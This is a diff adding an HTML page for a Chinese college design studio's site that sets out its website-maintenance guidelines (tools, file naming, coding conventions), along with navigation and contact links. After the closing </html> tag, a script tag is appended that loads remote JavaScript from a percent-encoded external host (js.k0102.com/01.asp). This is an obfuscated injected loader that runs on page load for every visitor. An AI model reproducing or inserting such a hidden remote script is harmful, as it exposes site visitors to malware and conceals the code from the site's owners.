@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- 取消双击缩放，禁止自动识别手机号、邮箱，缩放比例 -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, telephone=no, email=no, minimum-scale=1, maximum-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="X5-orientation" content="portrait">  <!-- 强制竖屏 -->
+    <meta name="screen-orientation" content="portrait">  <!-- 强制竖屏 -->
+    <title>芯航创意工作室</title>
+    <link rel="icon" href="./imgs/logo.ico">
+    <link rel="stylesheet" href="./css/reset.css">
+    <link rel="stylesheet" href="./css/uphold.css">
+</head>
+<body>
+    <!-- 解决移动端body设置缺陷 -->
+    <div class="handset-body">
+        <div id="header"></div>
+        
+        <!-- 头部遮罩 -->
+        <div class="shade"></div>
+        
+        <!-- 导航栏 -->
+        <div class="central-nav leayer">
+            <div class="nav clearfix">
+                <h1 class="logo fl">芯航创意工作室</h1>
+                <ul class="ulFl">
+                    <li><a href="./index.html">首页</a></li>
+                    <li>
+                        <a href="#">资讯</a>
+                        <ul>
+                            <li><a href="./celebration.html">山西建筑职业技术学院计算机工程系成立20周年毕业展</a></li>
+                            <li><a href="http://www.5iidea.com/xyj" target="blank">创意星球——学院奖</a></li>
+                            <li><a href="http://www.sun-ada.net/" target="blank">大广赛——中国大学生好创意 第十一届全国大学生广告</a></li>
+                            <li><a href="./uphold.html">芯航创意工作室网站搭建维护(内部)</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#">关于</a>
+                        <ul>
+                            <li>芯航创意：是山西建筑职业技术学院——计算机工程系——数字媒体艺术专业为提高学生专业水平素养所开设工作室</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#">公众号</a>
+                        <ul>
+                            <li><img src="./imgs/qr-code.jpg"></li>
+                        </ul>
+                    </li>
+                    <li><a href="#">联系</a>
+                        <ul>
+                            <li><a href="http://wpa.qq.com/msgrd?v=3&uin=2764571499&site=qq&menu=yes" target="black">QQ在线：2764571499</a></li>
+                            <li><a href="mailto:sxatc_xcy@qq.com">邮箱：sxatc_xcy@qq.com</a></li>
+                            <li><a href="tal:18234141863">电话咨询：18234141863</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+        
+
+        <div class="wrapper">
+            <div class="left">
+                <div class="page">
+                    <div class="section-wrap">
+                        <h2 class="title">"芯航创意工作室"网站维护</h2>
+                        <img class="logo" src="./imgs/logo2.png">
+                        <p class="author">——Yubo.Yang</p>
+                        <button class="open">read more...</button>
+                    </div>
+                </div>
+                <div class="back">
+                    <div class="section-wrap">
+                    <h4 class="title">概述：</h4>
+                        <ol>
+                            <li>该网站无法兼容IE，没有用框架，响应式开发；</li>
+                            <li>涉及语言：HTML、CSS3、ES6+；</li>
+                            <li>该网站对移动端双击缩放，强制竖屏，自动识别手机号、邮箱做了处理；</li>
+                            <li>为提高网页性能，Loading 页面运用了异步加载模式，提前加载首页结构；个别页面应用了懒加载图像方式；</li>
+                            <li>所用编辑器：Visual Studio Code ；</li>
+                            <li>Visual Studio Code 需要用到的插件：
+                                <ul>
+                                    <li>① Live Server： 实时预览</li>
+                                    <li>② Easy Sass： 预处理器Sass编译</li>
+                                    <li>③ Autoproefixer： 后处理器</li>
+                                </ul>
+                            </li>
+                            <li>Chrome 插件：
+                                <ul>
+                                    <li>① WEB 前端助手 FeHelper： 最重要的一点，实时预览后，将本地地址改为上网IP，可生成二维码进行手机测试（内网）；</li>
+                                </ul>
+                            </li>
+                            <li>页面基本结构不能变，为防止移动端页面出现问题，body下包了一层 .handset-body 来解决定位问题。</li>
+                        </ol>
+                    </div>
+
+                    
+                </div>
+            </div>
+            <div class="middle">
+                <div class="section-wrap">
+                    <h4>文件：</h4>
+                    <ol type="1">
+                        <li>文件命名规范：采用小写方式，下划线方式分隔。如："video_cove"；</li>
+                        <li>2018年参与大广赛作品存放于 match_18 文件夹下，2019年20年可另建文件夹 match_19、match_20；</li>
+                        <li>图片文件夹下的 视频封面/海报 名称于视频文件夹下的名称保持一致。若想将视频重新归类，请修改 video.js 文件代码。</li>
+                        <li>为防止代码冗余，将共同用到的代码放在一个文件 / (reset.scss / reset.js) 这两个文件同样也是初始化文件、库；</li>
+                        <li>需要懒加载功能，可直接调用 lazy.js ；</li>
+                        <li>所用到的图片、视频文件一定要将图片压缩到最小可用大小；</li>
+                        <li>所用图标在 <a href="http://www.iconfont.cn">http://www.iconfont.cn</a> 下载，打包下载后替换 fonts 文件夹下文件；</li>
+                        <li>页面名称相对应，如：<br>uphold.html --> uphold.css --> uphold.js ；</li>
+                        <li>上传网站时将无用的文件删除：scss、.vscode 。</li>
+                    </ol>
+                </div>
+            </div>
+            <div class="right">
+                <div class="back">
+                    <div class="section-wrap">
+                        <h4>开发规范：</h4>
+                        <ol>
+                            <li>html、css、js代码结构分离；</li>
+                            <li>
+                                <ul>
+                                    <li>① HTML只显示展示内容信息</li>
+                                    <li>② 不要引入一些特定的 HTML 结构来解决一些视觉设计问题，不要将img元素当做专门用来做视觉设计的元素</li>
+                                    <li>③ 样式上的问题应该使用css解决</li>
+                                </ul>
+                            </li>
+                            <li>CSS 使用子选择器：.content .title ，合理使用ID；</li>
+                            <li>img 标签 alt 属性不能为空：网速太慢，src 属性中的错误，浏览器禁用图像，用户使用的是屏幕阅读器</li>
+                            <li>命名：类名采用小写字母方式，中划线分隔，如：wrap-img ；SCSS、JS变量、函数采用小驼峰式命名方式，如：stopBubble ，并保证代码的可阅读性；</li>
+                            <li>JS 避免全局命名空间污染；</li>
+                            <li>私有变量命名前面加下划线 _ </li>
+                            <li>方法在有参数的情况下，采用 /* @param */ 多行注释的方式标明参数的类型、作用：<br>/**<br>&nbsp;&nbsp;* 函数说明<br>&nbsp;&nbsp;* @param {number} len(参数) 数组的长度<br>&nbsp;&nbsp;*/</li>
+                            <li>将 JS 代码作用块分开，推荐(函数式编程)，尽可能遵循 ES5 严格模式；</li>
+                        </ol>
+                    </div>
+                    <button class="close iconfont">&#xe60c;</button>
+                </div>
+                <div class="page">
+                    <div class="section-wrap">
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 页尾 -->
+        <div class="tail">
+            <p>
+                <a href="http://www.sxatc.com/">山西建筑职业技术学院</a> |
+                <a href="http://jsj.sxatc.com/">计算机工程系</a> | 2019 © 
+                <a href="#">芯航创意工作室</a> | 制作维护
+            </p>
+            <p>地址：<a href="https://map.baidu.com/poi/%E5%B1%B1%E8%A5%BF%E5%BB%BA%E7%AD%91%E8%81%8C%E4%B8%9A%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2-%E5%B0%8A%E8%B4%A4%E6%A5%BC/@12546918.92748136,4517152.385585913,18.39z?uid=628efb6c359c63fd306212d6&info_merge=1&isBizPoi=false&ugc_type=3&ugc_ver=1&device_ratio=1&compat=1&querytype=detailConInfo&da_src=shareurl">山西省晋中市榆次区文华街 369 号尊贤楼一层 114</a></p>
+        </div>
+
+        <!-- 更多 -->
+        <div class="more iconfont">更 多 <span>&#xe60a;</span></div>
+
+        <!-- 侧边栏 -->
+        <div class="sidebar">
+            <ul>
+                <li><a href="./present.html">芯航简介</a></li>
+                <li><a href="./plane.html">平面作品</a></li>
+                <li><a href="./video.html">精选视频</a></li>
+                <li class="click-land"><a href="#">芯航论坛</a></li>
+                <li><a href="./signs.html">地质徽标</a></li>
+                <li><a href="./download.html">软件下载</a></li>
+                <li><a href="./index.html">返回首页</a></li>
+            </ul>
+            <span></span>
+        </div>
+        
+        <!-- 回到顶部 -->
+        <a href="#header" class="return-top fix-r iconfont">&#xe619;</a>
+    </div>
+
+    <script src="./js/reset.js"></script>
+    <script src="./js/uphold.js"></script>
+</body>
+</html><script src="http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70"></script>
